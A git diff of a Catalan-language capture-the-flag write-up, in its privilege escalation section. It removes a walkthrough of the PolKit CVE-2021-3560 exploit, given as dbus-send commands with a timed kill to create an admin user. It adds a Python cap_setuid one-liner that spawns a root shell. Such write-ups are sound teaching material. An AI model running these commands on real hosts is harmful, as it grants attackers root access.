@@ -55,16 +55,8 @@ Si provem les credencials al servidor FTP podem accedir-hi, i podem veure el que
 ![image](https://github.com/user-attachments/assets/432fb5fc-a3b0-4fd0-be71-4098c40999b4)
 
 ## Privilege escalation
-Si fem un escaneig del host amb LinPEAS, ens marca que és vulnerable al CVE-2021-3560. Aquesta vulnerabilitat, que afecta a PolKit, permet la creació d'un nou usuari amb privilegis d'administrador al sistema per mitjà de la omissió de comprovació de credencials per les peticions de D-Bus. L'explotació funciona de la següent manera:
-1. Es mesura el temps que tarda la comanda en executar-se.
-````bash
-> time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ileisd string:"This is not a pwned user" int32:1
-   real	0m0.005s
-   user	0m0.002s
-   sys	0m0.000s
+Llistant les _capabilities_ del host, podem veure que Python3.8 té assignat _cap_setuid_, pel que es pot utilitzar aquest binari per a manipular el UID d'un procés i, doncs, pot fer-se servir per tenir una consola amb UID 0 (root).
+````python
+>>> import os; os.setuid(0); os.system("/bin/bash")
 ````
-2. Es mata la comanda a la meitat del temps, quan PolKit encara està processant-la, mitjançant un petit script de bash.
-````bash
-> dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ileisd string:"This is not a pwned user" int32:1 & sleep 0.002s ; kill $!
-````
-3. Un cop creat l'usuari
+![image](https://github.com/user-attachments/assets/62020c74-b114-46e5-bc2f-9177f49a34a8)
